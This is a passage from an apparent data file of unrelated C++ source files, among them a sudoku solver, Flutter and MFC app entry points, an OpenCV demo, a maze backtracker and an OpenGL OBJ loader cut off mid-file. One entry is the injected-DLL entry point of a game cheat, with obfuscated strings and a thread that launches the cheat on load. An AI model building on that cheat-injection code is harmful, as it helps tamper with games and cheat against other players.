newRootDicNode->initAsRoot(dictionaryStructurePolicy->getRootPosition(), prevWordIds);\n}\n\n/*static */ void DicNodeUtils::initAsRootWithPreviousWord(\n        const DictionaryStructureWithBufferPolicy *const dictionaryStructurePolicy,\n        const DicNode *const prevWordLastDicNode, DicNode *const newRootDicNode) {\n    newRootDicNode->initAsRootWithPreviousWord(\n            prevWordLastDicNode, dictionaryStructurePolicy->getRootPosition());\n}\n\n/* static */ void DicNodeUtils::initByCopy(const DicNode *const srcDicNode,\n        DicNode *const destDicNode) {\n    destDicNode->initByCopy(srcDicNode);\n}\n\n///////////////////////////////////\n// Traverse node expansion utils //\n///////////////////////////////////\n/* static */ void DicNodeUtils::getAllChildDicNodes(const DicNode *dicNode,\n        const DictionaryStructureWithBufferPolicy *const dictionaryStructurePolicy,\n        DicNodeVector *const childDicNodes) {\n    if (dicNode->isTotalInputSizeExceedingLimit()) {\n        return;\n    }\n    if (!dicNode->isLeavingNode()) {\n        childDicNodes->pushPassingChild(dicNode);\n    } else {\n        dictionaryStructurePolicy->createAndGetAllChildDicNodes(dicNode, childDicNodes);\n    }\n}\n\n///////////////////\n// Scoring utils //\n///////////////////\n/**\n * Computes the combined bigram / unigram cost for the given dicNode.\n */\n/* static */ float DicNodeUtils::getBigramNodeImprobability(\n        const DictionaryStructureWithBufferPolicy *const dictionaryStructurePolicy,\n        const DicNode *const dicNode, MultiBigramMap *const multiBigramMap) {\n    if (dicNode->hasMultipleWords() && !dicNode->isValidMultipleWordSuggestion()) {\n        return static_cast<float>(MAX_VALUE_FOR_WEIGHTING);\n    }\n    const WordAttributes wordAttributes = dictionaryStructurePolicy->getWordAttributesInContext(\n            dicNode->getPrevWordIds(), dicNode->getWordId(), multiBigramMap);\n    if (wordAttributes.getProbability() == NOT_A_PROBABILITY\n            || (dicNode->hasMultipleWords()\n                    && (wordAttributes.isBlacklisted() || wordAttributes.isNotAWord()))) {\n        return static_cast<float>(MAX_VALUE_FOR_WEIGHTING);\n    }\n    // TODO: This equation to calculate the improbability looks unreasonable.  Investigate this.\n    const float cost = static_cast<float>(MAX_PROBABILITY - wordAttributes.getProbability())\n            / static_cast<float>(MAX_PROBABILITY);\n    return cost;\n}\n\n} // namespace latinime\n",
    "\ufeff#include \"globals.hpp\"\n\n#if ALPHA || BETA\nHMODULE cheat_module{};\n\n// credits to @panzerfaust\nLONG __stdcall exception_handler(EXCEPTION_POINTERS* ex) {\n\t// continue execution on useless exceptions.\n\tif (ex->ExceptionRecord->ExceptionCode <= 0x80000000)\n\t\treturn EXCEPTION_CONTINUE_SEARCH;\n\n\t// try to get module name by crash address.\n\tHMODULE mod{};\n\tif (!GetModuleHandleExA(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (const char*)ex->ContextRecord->Eip, &mod)) {\n\t\t// get current mapped memory information.\n\t\tMEMORY_BASIC_INFORMATION mem{}, cheat{};\n\t\tif (VirtualQuery((void*)ex->ContextRecord->Eip, &mem, sizeof(mem))\n\t\t\t&& VirtualQuery((void*)exception_handler, &cheat, sizeof(cheat))) {\n\t\t\t// check if eip is located somewhere within cheat's .text section.\n\t\t\tif (mem.AllocationBase == cheat.AllocationBase)\n\t\t\t\tmod = (HMODULE)cheat_module;\n\t\t}\n\t}\n\n\tstd::string msg{};\n\tif (!mod) {\n\t\tmsg = tfm::format(CXOR(\"Exception 0x%x at 0x%x, no module info!\"), ex->ExceptionRecord->ExceptionCode, ex->ExceptionRecord->ExceptionAddress);\n\t\tMessageBoxA(nullptr, msg.c_str(), CXOR(\"CRASH!\"), MB_TOPMOST | MB_ICONERROR | MB_OK);\n\t\texit(ex->ExceptionRecord->ExceptionCode);\n\t}\n\n\t// get nearby bytes and convert them to hex equivalent.\n\tstd::string bytes;\n\tfor (int i = -10; i < 10; i++) {\n\t\tconst auto addr = ex->ContextRecord->Eip + i;\n\t\tif (addr < (uintptr_t)mod)\n\t\t\tcontinue;\n\t\tbytes += tfm::format(CXOR(\"%02X \"), *(uint8_t*)addr);\n\t}\n\n\tchar module_name[256]{};\n\tGetModuleFileNameA(mod, module_name, sizeof(module_name));\n\n\tstatic auto ntdll_dll = (\"ntdll.dll\");\n\tstatic auto tier0_dll = (\"tier0.dll\");\n\tstatic auto kernelbase_dll = (\"KERNELBASE.dll\");\n\n\tif (std::strstr(module_name, ntdll_dll) || std::strstr(module_name, tier0_dll) || std::strstr(module_name, kernelbase_dll))\n\t\treturn EXCEPTION_CONTINUE_SEARCH;\n\n\tmsg = tfm::format(CXOR(R\"#(Exception 0x%X at 0x%X\n--------------\nModule: %s\n\nLast bytes: %s\n \neax: %08X\nebx: %08X\necx: %08X\nedx: %08X\n-------------\n\nPress CTRL+C and send info to forum.)#\"), ex->ExceptionRecord->ExceptionCode, ex->ExceptionRecord->ExceptionAddress,\nmod == (HMODULE)cheat_module ? CXOR(\"ECLIPSE\") : module_name, bytes,\nex->ContextRecord->Eax, ex->ContextRecord->Ebx, ex->ContextRecord->Ecx, ex->ContextRecord->Edx);\n\n\t// display messagebox.\n\tMessageBoxA(nullptr, msg.c_str(), CXOR(\"CRASH!\"), MB_TOPMOST | MB_ICONERROR | MB_OK);\n\texit(ex->ExceptionRecord->ExceptionCode);\n\n\treturn EXCEPTION_CONTINUE_EXECUTION;\n}\n#endif\n\nBOOL APIENTRY DllMain(HMODULE module, DWORD reason, LPVOID reserved)\n{\n\tif (reason == DLL_PROCESS_ATTACH)\n\t{\n#ifdef _DEBUG\n\t\tHACKS->modules.dllmain = module;\n\t\tCreateThread(0, 0, (LPTHREAD_START_ROUTINE)init_cheat, 0, 0, 0);\n#else\n#if ALPHA || BETA\n\t\tcheat_module = module;\n\n\t\tAddVectoredExceptionHandler(TRUE, exception_handler);\n#endif\n\n\t\tstd::thread(init_cheat, reserved).detach();\n#endif\n\n\t\treturn TRUE;\n\t}\n\n\treturn false;\n}",
    "// Copyright 2009-2022 NTESS. Under the terms\n// of Contract DE-NA0003525 with NTESS, the U.S.\n// Government retains certain rights in this software.\n//\n// Copyright (c) 2009-2022, NTESS\n// All rights reserved.\n//\n// Portions are copyright of other developers:\n// See the file CONTRIBUTORS.TXT in the top level directory\n// of the distribution for more information.\n//\n// This file is part of the SST software package. For license\n// information, see the LICENSE file in the top level directory of the\n// distribution.\n\n// SST includes\n#include \"sst_config.h\"\n\n\n// local includes\n#include \"c_MemhBridge.hpp\"\n#include \"c_AddressHasher.hpp\"\n#include \"c_TxnConverter.hpp\"\n#include \"c_TxnScheduler.hpp\"\n#include \"c_CmdReqEvent.hpp\"\n#include \"c_CmdResEvent.hpp\"\n#include \"c_DeviceDriver.hpp\"\n#include \"c_Dimm.hpp\"\n#include \"c_Controller.hpp\"\n#include \"c_TxnDispatcher.hpp\"\n#include \"c_TxnGen.hpp\"\n#include \"c_TraceFileReader.hpp\"\n\n\n// namespaces\nusing namespace SST;\nusing namespace SST::CramSim;\nusing namespace SST::Statistics;\n\n",
    "#include<iostream>\r\n#include <bits/stdc++.h>\r\n#include<fstream>\r\nusing namespace std;\r\n\r\nclass Sudoku{\r\n    public:\r\n    Sudoku(){\r\n        solveSudoku();\r\n    }\r\n    private:\r\n    vector<vector<char>> board;\r\n    void add(vector<vector<set<char>>> &options){\r\n        set<char> st={'1','2','3','4','5','6','7','8','9'};\r\n        vector<set<char>> row;\r\n        for(int i=0;i<9;i++)\r\n            row.push_back(st);\r\n        for(int i=0;i<9;i++)\r\n            options.push_back(row);\r\n    }\r\n    void remove(vector<vector<set<char>>> &options,int i,int j,char ch){\r\n        for(int r=0;r<9;r++){\r\n            auto pos=options[r][j].find(ch);\r\n            if(pos != options[r][j].end())\r\n                options[r][j].erase(pos);\r\n            pos=options[i][r].find(ch);\r\n            if(pos != options[i][r].end())\r\n                options[i][r].erase(pos);\r\n        }\r\n        int v1=(i/3)*3,v2=(j/3)*3;\r\n        for(int r=v1;r<v1+3;r++){\r\n            for(int c=v2;c<v2+3;c++){\r\n                auto pos=options[r][c].find(ch);\r\n                if(pos != options[r][c].end())\r\n                    options[r][c].erase(pos);\r\n            }\r\n        }\r\n    }\r\n    bool solve(vector<vector<set<char>>> &options,int r,int c){\r\n        if(c>8) return true;\r\n        if(board[r][c]=='.' && options[r][c].size()>0){\r\n            for(auto it=options[r][c].begin();it!=options[r][c].end();it++){\r\n                board[r][c]=*it;\r\n                vector<vector<set<char>>> optionstemp=options;\r\n                remove(optionstemp,r,c,board[r][c]);\r\n                if(r+1<9){\r\n                    if(solve(optionstemp,r+1,c))\r\n                        return true;\r\n                    else\r\n                        board[r][c]='.';\r\n                }\r\n                else{\r\n                    if(solve(optionstemp,0,c+1))\r\n                        return true;\r\n                    else\r\n                        board[r][c]='.';\r\n                }\r\n            }\r\n        }\r\n        else if(board[r][c]>='0' && board[r][c]<='9'){\r\n            if(r+1<9)\r\n                return solve(options,r+1,c);\r\n            else\r\n                return solve(options,0,c+1);\r\n        }\r\n        return false;\r\n    }\r\n    void solveSudoku(){\r\n        if(!takeInput() || !isValidSudoku()){\r\n            cout<<\"Invalid Input\\n\";\r\n            return;\r\n        }\r\n        vector<vector<set<char>>> options;\r\n        add(options);\r\n        for(int i=0;i<9;i++){\r\n            for(int j=0;j<9;j++){\r\n                if(board[i][j] != '.')\r\n                    remove(options,i,j,board[i][j]);\r\n            }\r\n        }\r\n        solve(options,0,0);\r\n        cout<<\"Solution saved in 'Output.txt'\";\r\n        output();\r\n    }\r\n    bool isValidSudoku() {\r\n        for(int i=0;i<9;i++){\r\n            set<char> st1,st2;\r\n            for(int j=0;j<9;j++){\r\n                if(st1.find(board[i][j]) != st1.end()) return false;\r\n                else if(board[i][j] != '.') st1.emplace(board[i][j]);\r\n                if(st2.find(board[j][i]) != st2.end()) return false;\r\n                else if(board[j][i] != '.') st2.emplace(board[j][i]);\r\n            }\r\n        }\r\n        for(int i=0;i<9;i=i+3){\r\n            for(int j=0;j<9;j=j+3){\r\n                set<char> st;\r\n                for(int k=i;k<i+3;k++){\r\n                    for(int h=j;h<j+3;h++){\r\n                        if(st.find(board[k][h]) != st.end()) return false;\r\n                        else if(board[k][h] != '.') st.emplace(board[k][h]);\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        return true;\r\n    }\r\n    bool takeInput(){\r\n        ifstream ipfile(\"Input.txt\");\r\n        for(int i=0;i<9;i++){\r\n            vector<char> row;\r\n            string st;\r\n            getline(ipfile,st);\r\n            int j=0;\r\n            for(;j<9 && j<st.length();j++){\r\n                if(st.at(j)>='0' && st.at(j)<='9')\r\n                    row.push_back(st.at(j));\r\n                else if(st.at(j)==' ')\r\n                    row.push_back('.');\r\n                else return false;\r\n            }\r\n            for(;j<9;j++)\r\n                row.push_back('.');\r\n            board.push_back(row);\r\n        }\r\n        output();\r\n        return true;\r\n    }\r\n    void output(){\r\n        ofstream opfile(\"Output.txt\");\r\n        for(int i=0;i<9;i++){\r\n            string s=\"\";\r\n            for(int j=0;j<9;j++){\r\n                s=s+board[i][j]+\" \";\r\n            }\r\n            if(i<8)\r\n                s+=\"\\n\";\r\n            opfile<<s;\r\n        }\r\n    }\r\n};\r\n\r\nint main(){\r\n    Sudoku s;\r\n    return 0;\r\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"dicee_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"learning_flutter\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n#include <opencv2/opencv.hpp>\n#include <chrono>\n#include <cmath>\n#include <vector>\n\n// Define the weight of the noise in the final blend\n// #define NOISE_WEIGHT 0.33 // Adjust this value as needed (e.g., 0.33 for 1/3)\n\n// Define whether to apply low-pass filtering to the noise\n#define APPLY_LOW_PASS_FILTER true // Set to false to disable low-pass filtering\n\n\n// Load a grayscale image\ncv::Mat loadImage(const std::string& imageFile) {\n    cv::Mat img = cv::imread(imageFile, cv::IMREAD_GRAYSCALE);\n    if (img.empty()) {\n        std::cerr << \"Couldn't open image \" << imageFile << \".\\n\";\n        exit(-1);\n    }\n    return img;\n}\n\n// Generate grayscale noise frames\nstd::vector<cv::Mat> generateNoiseFrames(int width, int height, int numFrames, bool applyFilter) {\n    std::vector<cv::Mat> noiseFrames;\n    for (int i = 0; i < numFrames; ++i) {\n        cv::Mat noise(height, width, CV_8UC1);\n        for (int y = 0; y < height; ++y) {\n            for (int x = 0; x < width; ++x) {\n                float value = static_cast<float>(rand() % 256);\n                noise.at<uchar>(y, x) = static_cast<uchar>(value);\n            }\n        }\n        if (applyFilter) {\n            cv::GaussianBlur(noise, noise, cv::Size(5, 5), 0);\n\n            // Transform the noise\n            noise.convertTo(noise, CV_32F); // Convert to float for transformation\n            noise -= 128; // Subtract 128\n            noise *= 2;   // Multiply by 2\n            noise += 128; // Add 128 back\n            noise.convertTo(noise, CV_8UC1); // Convert back to 8-bit\n        }\n        noiseFrames.push_back(noise);\n    }\n    return noiseFrames;\n}\n\n// Create a parabolic lookup table\ncv::Mat createParabolicLUT() {\n    cv::Mat lut(1, 256, CV_8UC1);\n    for (int i = 0; i < 256; ++i) {\n        float normalized = i / 255.0f;\n        lut.at<uchar>(i) = static_cast<uchar>(std::round(255.0f * normalized * normalized));\n    }\n    return lut;\n}\n\n// Function to blend images and noise, and apply LUT\nvoid blendImagesAndNoise(const cv::Mat& img1, const cv::Mat& img2, const std::vector<cv::Mat>& noiseFrames, \n                         cv::Mat& resultImg, const cv::Mat& lut, float imageBlendWeight, \n                         float noiseWeight) {\n    // Static variable to keep track of the noise frame index\n    static int noiseFrameIndex = 0;\n\n    // Use pre-generated noise frame\n    cv::Mat noise = noiseFrames[noiseFrameIndex];\n    noiseFrameIndex = (noiseFrameIndex + 1) % noiseFrames.size();\n\n    // Blend image1 and image2\n    cv::Mat blendedImages;\n    cv::addWeighted(img1, imageBlendWeight, img2, imageBlendWeight, 0.0, blendedImages);\n\n    // Blend the result with noise\n    cv::Mat finalBlendedImg;\n    cv::addWeighted(blendedImages, 1.0f - noiseWeight, noise, noiseWeight, 0.0, finalBlendedImg);\n\n    // Apply the parabolic lookup table using cv::LUT\n    cv::LUT(finalBlendedImg, lut, resultImg);\n}\n\nint main() {\n    std::string imageFile1 = \"/home/jim/Desktop/PiTests/images/image.jpg\"; // Path to your first image file\n    std::string imageFile2 = \"/home/jim/Desktop/PiTests/images/image2.jpg\"; // Path to your second image file\n\n    cv::Mat img1 = loadImage(imageFile1);\n    cv::Mat img2 = loadImage(imageFile2);\n\n    const int numNoiseFrames = 30;\n    std::vector<cv::Mat> noiseFrames = generateNoiseFrames(img1.cols, img1.rows, numNoiseFrames, APPLY_LOW_PASS_FILTER);\n\n    cv::namedWindow(\"Blended Image Playback\", cv::WINDOW_NORMAL); // Use WINDOW_NORMAL to allow resizing\n    cv::resizeWindow(\"Blended Image Playback\", img1.cols, img1.rows); // Resize the window to the image size\n\n    const float NOISE_WEIGHT = .6;\n    // Calculate the weight of the blended image\n    const float imageBlendWeight = 1.0f - NOISE_WEIGHT;\n    const float noiseWeight = NOISE_WEIGHT;\n\n    // Create the parabolic lookup table\n    cv::Mat lut = createParabolicLUT();\n\n    cv::namedWindow(\"Blended Image Playback\", cv::WINDOW_NORMAL); // Use WINDOW_NORMAL to allow resizing\n    cv::setWindowProperty(\"Blended Image Playback\", cv::WND_PROP_FULLSCREEN, cv::WINDOW_FULLSCREEN); // Set window to fullscreen\n\n\n\n\n    while (true) {\n        auto loopStartTime = std::chrono::steady_clock::now();\n\n        cv::Mat transformedImg;\n        blendImagesAndNoise(img1, img2, noiseFrames, transformedImg, lut, imageBlendWeight, noiseWeight);\n\n        transformedImg *= 1.5;\n\n        cv::imshow(\"Blended Image Playback\", transformedImg);\n\n        // Check for escape key press\n        int key = cv::waitKey(1);\n        if (key == 27) { // ASCII code for the escape key\n            break;\n        }\n\n        auto loopEndTime = std::chrono::steady_clock::now();\n        std::chrono::duration<double> elapsed_seconds = loopEndTime - loopStartTime;\n        std::cout << \"Loop duration: \" << elapsed_seconds.count() << \"s\\n\";\n    }\n\n    return 0;\n}\n",
    "\n// Devoir4.cpp : Defines the class behaviors for the application.\n//\n\n#include \"pch.h\"\n#include \"framework.h\"\n#include \"Devoir4.h\"\n#include \"Devoir4Dlg.h\"\n\n#ifdef _DEBUG\n#define new DEBUG_NEW\n#endif\n\n\n// CDevoir4App\n\nBEGIN_MESSAGE_MAP(CDevoir4App, CWinApp)\n\tON_COMMAND(ID_HELP, &CWinApp::OnHelp)\nEND_MESSAGE_MAP()\n\n\n// CDevoir4App construction\n\nCDevoir4App::CDevoir4App()\n{\n\t// support Restart Manager\n\tm_dwRestartManagerSupportFlags = AFX_RESTART_MANAGER_SUPPORT_RESTART;\n\n\t// TODO: add construction code here,\n\t// Place all significant initialization in InitInstance\n}\n\n\n// The one and only CDevoir4App object\n\nCDevoir4App theApp;\n\n\n// CDevoir4App initialization\n\nBOOL CDevoir4App::InitInstance()\n{\n\t// InitCommonControlsEx() is required on Windows XP if an application\n\t// manifest specifies use of ComCtl32.dll version 6 or later to enable\n\t// visual styles.  Otherwise, any window creation will fail.\n\tINITCOMMONCONTROLSEX InitCtrls;\n\tInitCtrls.dwSize = sizeof(InitCtrls);\n\t// Set this to include all the common control classes you want to use\n\t// in your application.\n\tInitCtrls.dwICC = ICC_WIN95_CLASSES;\n\tInitCommonControlsEx(&InitCtrls);\n\n\tCWinApp::InitInstance();\n\n\n\tAfxEnableControlContainer();\n\n\t// Create the shell manager, in case the dialog contains\n\t// any shell tree view or shell list view controls.\n\tCShellManager *pShellManager = new CShellManager;\n\n\t// Activate \"Windows Native\" visual manager for enabling themes in MFC controls\n\tCMFCVisualManager::SetDefaultManager(RUNTIME_CLASS(CMFCVisualManagerWindows));\n\n\t// Standard initialization\n\t// If you are not using these features and wish to reduce the size\n\t// of your final executable, you should remove from the following\n\t// the specific initialization routines you do not need\n\t// Change the registry key under which our settings are stored\n\t// TODO: You should modify this string to be something appropriate\n\t// such as the name of your company or organization\n\tSetRegistryKey(_T(\"Local AppWizard-Generated Applications\"));\n\n\tCDevoir4Dlg dlg;\n\tm_pMainWnd = &dlg;\n\tINT_PTR nResponse = dlg.DoModal();\n\tif (nResponse == IDOK)\n\t{\n\t\t// TODO: Place code here to handle when the dialog is\n\t\t//  dismissed with OK\n\t}\n\telse if (nResponse == IDCANCEL)\n\t{\n\t\t// TODO: Place code here to handle when the dialog is\n\t\t//  dismissed with Cancel\n\t}\n\telse if (nResponse == -1)\n\t{\n\t\tTRACE(traceAppMsg, 0, \"Warning: dialog creation failed, so application is terminating unexpectedly.\\n\");\n\t\tTRACE(traceAppMsg, 0, \"Warning: if you are using MFC controls on the dialog, you cannot #define _AFX_NO_MFC_CONTROLS_IN_DIALOGS.\\n\");\n\t}\n\n\t// Delete the shell manager created above.\n\tif (pShellManager != nullptr)\n\t{\n\t\tdelete pShellManager;\n\t}\n\n#if !defined(_AFXDLL) && !defined(_AFX_NO_MFC_CONTROLS_IN_DIALOGS)\n\tControlBarCleanUp();\n#endif\n\n\t// Since the dialog has been closed, return FALSE so that we exit the\n\t//  application, rather than start the application's message pump.\n\treturn FALSE;\n}\n\n",
    "#include <iostream>\n#include<vector>\nusing namespace std;\n\n\n\n//a function that will handle all the below mentioned possibilities:\n//posssiblity hai\n\t//-> path closed\n\t//out if bound \n\t// check is pos is already visited\nbool isSafe(int srcx, int srcy, int newx, int newy, int maze[][4], int row, int col,  vector<vector<bool > > &visited) {\n\tif(\n\t\t(newx >=0 && newx <row) &&\n\t\t(newy >=0 && newy < col) &&\n\t\tmaze[newx][newy] == 1 &&\n\t\tvisited[newx][newy] == false\n\t\t) {\n\t\treturn true;\n\t\t}\n\telse {\n\t\treturn false;\n\t}\n}\n\n\nvoid printAllPath(int maze[][4], int row, int col, int srcx, int srcy, string &output, vector<vector<bool > > &visited) {\n\n\t//base case\n\t//destination coordinates are [row-1], [col-1]\n\tif(srcx == row-1 && srcy == col-1) {\n\t\t//reached destination\n\t\tcout << output << endl;\n\t\treturn;\n\t}\n\n\n\t//1 case solve karo and baakai recursion sambhal lega\n\n\t//UP\n\tint newx = srcx-1;\n\tint newy = srcy;\n\tif(isSafe(srcx, srcy, newx, newy,maze,row,col,visited )) {\n\t\t//mark visited\n\t\tvisited[newx][newy] = true;\n\t\t//call recursion\n\t\toutput.push_back('U');\n\t\tprintAllPath(maze, row, col, newx, newy, output , visited );\n\t\t//backtracking\n\t\toutput.pop_back();\n\t\tvisited[newx][newy] = false;\n\t}\n\n\n\t//RIGHT\n\t newx = srcx;\n\t newy = srcy+1;\n\tif(isSafe(srcx, srcy, newx, newy,maze,row,col,visited )) {\n\t\t//mark visited\n\t\tvisited[newx][newy] = true;\n\t\t//call recursion\n\t\toutput.push_back('R');\n\t\tprintAllPath(maze, row, col, newx, newy, output , visited );\n\t\t//backtracking\n\t\toutput.pop_back();\n\t\tvisited[newx][newy] = false;\n\t}\n\n\t//DOWN\n\tnewx = srcx+1;\n\t newy = srcy;\n\tif(isSafe(srcx, srcy, newx, newy,maze,row,col,visited )) {\n\t\t//mark visited\n\t\tvisited[newx][newy] = true;\n\t\t//call recursion\n\t\toutput.push_back('D');\n\t\tprintAllPath(maze, row, col, newx, newy, output , visited );\n\t\t//backtracking\n\t\toutput.pop_back();\n\t\tvisited[newx][newy] = false;\n\t}\n\n\n\t//LEFT\n\tnewx = srcx;\n\t newy = srcy-1;\n\tif(isSafe(srcx, srcy, newx, newy,maze,row,col,visited )) {\n\t\t//mark visited\n\t\tvisited[newx][newy] = true;\n\t\t//call recursion\n\t\toutput.push_back('L');\n\t\tprintAllPath(maze, row, col, newx, newy, output , visited );\n\t\t//backtracking\n\t\toutput.pop_back();\n\t\tvisited[newx][newy] = false;\n\t}\n\t\n}\n\n\nint main() {\n\n\tint maze[4][4] = {\n\t{1,0,0,0},\n\t{1,1,0,0},\n\t{1,1,1,0},\n\t{1,1,1,1}\n\t};\n\tint row = 4;\n\tint col = 4;\n\n\tint srcx = 0;\n\tint srcy = 0;\n\tstring output = \"\";\n\n\t//craete visited 2D ARRAY\n\tvector<vector<bool > > visited(row, vector<bool>(col, false));\n\t\n\tif(maze[0][0] == 0) {\n\t\t//src position is Closed, that means RAT cannot move\n\t\tcout << \"No Path Exists\" << endl;\n\t}\n\telse {\n\t\tvisited[srcx][srcy] = true;\n\t\tprintAllPath(maze, row, col, srcx, srcy, output, visited);\n\t}\n\t\n\n\n\treturn 0;\n}",
    "/*\r\n    Created by LuckyIntel from github.\r\n\r\n    Version 0.1\r\n\r\n    For best performance atleast compile with -O1 parameter in GCC.\r\n\r\n    To load your OBJ, change \"OBJpath\" to your OBJ file's\r\n    path, no other info is needed to load the OBJ file.\r\n\r\n    I made this app in Windows however this must work\r\n    just like Windows in Linux.I mean, i think it will.\r\n    I don't own a Linux so there can be some problems.\r\n    If anything unexpected happens just create a new \r\n    issue in the repo and i will try my best to help you!\r\n\r\n    About Mac OS, i don't own one.If you occur any issue\r\n    and use Mac OS, you can use issues too.I will try my \r\n    best.Alternatively problaly pray to god or something.\r\n\r\n    WARNING : If you want to change eye speed in the\r\n    runtime please remove \"constexpr\" keyword from it\r\n    so you can change it.\r\n\r\n    WARNING : Please atleast use OpenGL Core version 3.3\r\n    to prevent any unexpected behavior.This application\r\n    also runs with never versions such as OpenGL Core\r\n    version 4.6\r\n    \r\n    How can you change the version?\r\n    in the code change your OpenGL version with\r\n    changing the 3's in the following code:\r\n\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 3);\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\r\n\r\n    So if you want to set your OpenGL version to 4.6\r\n    you can just do this :\r\n\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\r\n    glfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 6);\r\n\r\n    Major is the number before dot, minor is the vice versa of it.\r\n\r\n    TODO LIST (For V0.2):\r\n     1. Fix texture reusing and color reusing\r\n     2. Add lighting (default.frag)\r\n     3. Make code more read-able, add more commentaries (half way done)\r\n     4. Make OBJ loading easier with dear imgui\r\n*/\r\n\r\n#include \"OBJLoader.hpp\"\r\n#define STB_IMAGE_IMPLEMENTATION\r\n#include <stbi/stb_image.h>\r\n#include <glad/glad.h>\r\n#include <glm/glm.hpp>\r\n#include <glm/gtc/type_ptr.hpp>\r\n#include <glm/gtc/matrix_transform.hpp>\r\n#include <fstream>\r\n#include <GLFW/glfw3.h>\r\n#include <iostream>\r\n#include <vector>\r\n\r\nconst std::string OBJpath = \"your/obj/file/path\"; // Your OBJ file's path.\r\n\r\nint WIDTH = 800;\r\nint HEIGHT = 600;\r\nfloat aspectRatio = (float)WIDTH / HEIGHT;\r\n\r\nglm::vec3 eyePos = glm::vec3(0.0f, 0.0f, -3.0f);\r\nglm::vec3 eyeFront = glm::vec3(0.0f, 0.0f, 1.0f);\r\nglm::vec3 eyeUp = glm::vec3(0.0f, 1.0f, 0.0f);\r\nconstexpr float eyeSpeed = 0.05;\r\n\r\nchar* filetobuf(const char *file)\r\n{\r\n    /*\r\n        \"filetobuf\" function comes from www.khronos.org tutorials.\r\n    */\r\n    FILE *fptr;\r\n    long length;\r\n    char *buf;\r\n\r\n    fptr = fopen(file, \"rb\"); /* Open file for reading */\r\n    if (!fptr) /* Return NULL on failure */\r\n        return NULL;\r\n    fseek(fptr, 0, SEEK_END); /* Seek to the end of the file */\r\n    length = ftell(fptr); /* Find out how many bytes into the file we are */\r\n    buf = (char*)malloc(length+1); /* Allocate a buffer for the entire length of the file and a null terminator */\r\n    fseek(fptr, 0, SEEK_SET); /* Go back to the beginning of the file */\r\n    fread(buf, length, 1, fptr); /* Read the contents of the file in to the buffer */\r\n    fclose(fptr); /* Close the file */\r\n    buf[length] = 0; /* Null terminator */\r\n\r\n    return buf; /* Return the buffer */\r\n};\r\n\r\nGLuint loadTexture(std::string filePath)\r\n{\r\n    GLuint id;\r\n    int iW, iH, iCc, iF; // width, height, color channel, format\r\n    unsigned char* img = stbi_load(filePath.c_str(), &iW, &iH, &iCc, 0);\r\n    switch (iCc) // Check color channel to find the format of the image.\r\n    {\r\n        case 1:\r\n            iF = GL_RED; // R\r\n            break;\r\n        case 3:\r\n            iF = GL_RGB; // RGB\r\n            break;\r\n        case 4:\r\n            iF = GL_RGBA; // RGBA\r\n            break;\r\n    };\r\n    glGenTextures(1, &id);\r\n    glBindTexture(GL_TEXTURE_2D, id);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\r\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\r\n    glGenerateMipmap(id);\r\n    glTexImage2D(GL_TEXTURE_2D, 0, iF, iW, iH, 0, iF, GL_UNSIGNED_BYTE, img);\r\n    stbi_image_free(img);\r\n    return id;\r\n};\r\n\r\nclass Shader\r\n{\r\n    public:\r\n        GLuint id;\r\n        Shader(const char* vertexPath, const char* fragmentPath)\r\n        {\r\n            GLchar* vSrc = filetobuf(vertexPath);\r\n            GLchar* fSrc = filetobuf(fragmentPath);\r\n  